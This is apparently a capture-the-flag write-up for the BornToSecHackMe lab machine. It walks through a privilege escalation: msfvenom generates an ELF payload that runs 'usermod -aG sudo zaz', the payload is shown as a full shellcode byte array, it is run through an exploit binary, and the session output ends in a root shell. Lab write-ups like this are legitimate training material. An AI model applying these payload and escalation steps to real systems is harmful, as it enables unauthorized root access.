# dirtyc0w - usermod -aG sudo zaz

First, log in as the `zaz` user. Next, create a file called `dirty_usermod.c.` This script will back up `/home/zaz/exploit_me` and execute `usermod -aG sudo zaz`.
Finally, we need to use `msfvenom` to create our payload.

```
┌──(kali㉿kali)-[~]
└─$ msfvenom -platform Linux -p linux/x86/exec CMD="usermod -aG sudo zaz" -f elf -a x86 -o payload
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No encoder specified, outputting raw payload
Payload size: 56 bytes
Final size of elf file: 140 bytes
Saved as: payload
┌──(kali㉿kali)-[~]
└─$ xxd -i payload
unsigned char payload[] = {
0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x00,
0x54, 0x80, 0x04, 0x08, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x80, 0x04, 0x08, 0x00, 0x80, 0x04, 0x08, 0x8c, 0x00, 0x00, 0x00,
0xc4, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
0x6a, 0x0b, 0x58, 0x99, 0x52, 0x66, 0x68, 0x2d, 0x63, 0x89, 0xe7, 0x68,
0x2f, 0x73, 0x68, 0x00, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3, 0x52,
0xe8, 0x15, 0x00, 0x00, 0x00, 0x75, 0x73, 0x65, 0x72, 0x6d, 0x6f, 0x64,
0x20, 0x2d, 0x61, 0x47, 0x20, 0x73, 0x75, 0x64, 0x6f, 0x20, 0x7a, 0x61,
0x7a, 0x00, 0x57, 0x53, 0x89, 0xe1, 0xcd, 0x80
};
unsigned int payload_len = 140;
```

We put our payload into our C file, and now we can run it.

```
zaz@BornToSecHackMe:~$ ./exploit_me
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz)
```

We just need to log back in to `zaz` to update our privileges.

```
        ____                _______    _____           
       |  _ \              |__   __|  / ____|          
       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___ 
       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__ 
       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|

                       Good luck & Have fun
zaz@10.11.250.226's password: 
zaz@BornToSecHackMe:~$ id
uid=1005(zaz) gid=1005(zaz) groups=1005(zaz),27(sudo)
zaz@BornToSecHackMe:~$ sudo whoami
[sudo] password for zaz: 
root
```

GG!